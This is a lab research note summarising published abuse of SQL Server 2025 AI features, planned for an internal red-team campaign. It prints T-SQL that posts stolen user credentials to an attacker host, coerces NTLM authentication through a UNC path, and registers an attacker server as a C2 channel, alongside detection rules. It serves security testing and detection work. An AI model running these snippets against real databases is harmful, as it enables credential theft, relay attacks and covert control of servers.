# SQL Server 2025 AI Features — Data Exfil, NTLM Coercion, C2 Transport

> **Source:** https://specterops.io/blog/2026/06/10/oops-i-weaponized-the-database-abusing-ai-features-in-mssql-2025/
> **PoC:** https://github.com/gershsec/mssql2025-poc
> **Author:** Justin Kalnasy (SpecterOps)
> **Date:** 2026-06-10
> **MITRE:** T1567, T1218, T1071
> **CADRE mapping:** Campaign_suggestions.md #31, Phase 3

---

## What It Is

SQL Server 2025 (released Nov 2025) introduces native AI features that attackers can weaponize for data exfiltration, NTLM coercion, and C2 transport.

## Three Weaponized Features

### 1. sp_invoke_external_rest_endpoint — Native HTTPS Exfil

Stored procedure that makes HTTPS requests from SQL Server to arbitrary endpoints. 100MB payload limit.

```sql
-- Enable
EXEC sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;

-- Exfil database contents
DECLARE @payload NVARCHAR(MAX);
SELECT @payload = (SELECT username, password FROM dbo.app_users FOR JSON AUTO);
EXEC sp_invoke_external_rest_endpoint
  @url = N'https://attacker:8081/collect',
  @method = 'POST',
  @payload = @payload;
```

**Also:** File exfil via `OPENROWSET` + REST endpoint. Persistent exfil via TRIGGER on table INSERT.

### 2. CREATE EXTERNAL MODEL + UNC — NTLM SMB Coercion

`CREATE EXTERNAL MODEL` supports ONNX Runtime with local paths. Specifying UNC paths coerces NTLM auth over SMB.

```sql
EXEC sp_configure 'external AI runtimes enabled', 1;
ALTER DATABASE SCOPED CONFIGURATION SET PREVIEW_FEATURES = ON;
RECONFIGURE WITH OVERRIDE;

CREATE EXTERNAL MODEL onnx_unc
WITH (
  LOCATION = '\\ATTACKER\share',
  API_FORMAT = 'ONNX Runtime',
  MODEL_TYPE = EMBEDDINGS,
  MODEL = 'test',
  LOCAL_RUNTIME_PATH = '\\ATTACKER\share'
);

SELECT AI_GENERATE_EMBEDDINGS(N'test' USE MODEL onnx_unc);
-- → NTLM auth coerced to ATTACKER
```

**Microsoft response:** "Not a security boundary" — won't fix. This is permanent.

### 3. AI_GENERATE_EMBEDDINGS — C2 Transport

Embedding traffic as C2 channel. Traffic looks like legitimate AI model calls.

```sql
-- Register C2 server as external model
CREATE EXTERNAL MODEL c2_model
WITH (
  LOCATION = N'https://attacker:5000/v1/embeddings',
  API_FORMAT = 'OpenAI',
  MODEL_TYPE = EMBEDDINGS,
  MODEL = N'fake-model'
);

-- C2 check-in via embeddings
SELECT AI_GENERATE_EMBEDDINGS(N'checkin' USE MODEL c2_model);
```

**Full C2 agent:** 81-line TSQL with WHILE loop, xp_cmdshell for execution, embeddings for transport. CLR assembly version uses P/Invoke CreateProcessW (no xp_cmdshell dependency).

## Why This Breaks Detection

- **Decades of "egress from DB = bad" heuristic breaks** — HTTPS from SQL Server is now legitimate
- **100MB payload** — massive data exfil in single request
- **C2 traffic looks like AI model calls** — embedding vectors are opaque
- **NTLM coercion is permanent** — Microsoft won't fix

## Detection Rules (from article)

| What to Detect | How |
|---------------|-----|
| xp_cmdshell / CLR / SQL Agent | SQL Audit + Extended Events |
| CREATE/ALTER/DROP EXTERNAL MODEL | SQL Audit DDL text |
| `external rest endpoint enabled` | SQL ERRORLOG |
| Egress HTTPS from SQL Server | Firewall rules — block unknown domains |
| C2 vs legitimate traffic | Traffic baseline comparison |

## CADRE Application

- **Prerequisite:** sysadmin on mbr02 (SQL Server 2025 Developer Edition — already installed)
- **Attack chain:** xp_cmdshell → sysadmin → enable REST endpoint → exfil/coerce/C2
- **New coercion primitive:** CREATE EXTERNAL MODEL + UNC → NTLM capture (like PetitPotam but via SQL)
- **Detection:** SQL Audit rules + Suricata rules for REST endpoint traffic + Sysmon for CLR loading
- **Phase 3 extension:** Adds 3 new attack techniques to existing MSSQL attack surface

## Lab Status

- mbr02: SQL Server 2025 Developer Edition — **already installed**
- Tools: already staged on mbr02
- Testing: when campaign reaches mbr02 in later phases
- Config: enable `external rest endpoint enabled`, `external AI runtimes enabled`
- New detection rules: SQL Audit for EXTERNAL MODEL, REST endpoint, CLR assembly

---

*Last updated: 2026-06-10*
